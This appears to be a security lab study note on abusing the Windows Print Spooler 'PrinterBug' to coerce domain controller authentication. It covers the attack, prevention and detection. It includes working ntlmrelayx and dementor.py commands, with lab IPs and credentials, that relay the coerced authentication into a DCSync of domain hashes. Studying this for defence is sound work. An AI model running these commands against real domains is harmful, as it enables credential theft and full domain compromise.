Description:

  - Print Spooler is an old service enabled by default

  - RpcRemoteFindFirstPrinterChangeNotification and RpcRemoteFindFirstPrinterChangeNotificationEx can be abused to force a remote machine to perform a connection to any other
    machine it can reach.

  - The reverse connection will carry authentication informatin as a TGT.

  - Any Domain user can coerce RemoteServer$ to authenticate to any machine.


Attack:

  - We will relay connection to another DC and perform DCSync

    impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support

  - Next trigger the PrinterBug using NTLMRelayx listening.

  - Utilize Dementor on Kali to trigger connection back.

    python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123

  - Switching back to terminal session with NTLMRelayx we will see the DCSync was successful


Prevention:

  - Print spooler should be disabled on all servers that are not printing servers

  - DC and other core servers should never have additional roles/functionalities that open and widen the attack surface toward the core AD infrastructure

  - Disable the registry key RegisterSpoolerRemoteRpcEndPoint: this will block remote requests

  - Setting the key value to 1 enables and 2 disables


Detection:

  - To obtain hashes as DC1 from DC2 there will be a successful logon event for DC1. Event will have a source IP that does not match the DC since it is coming from kali machine
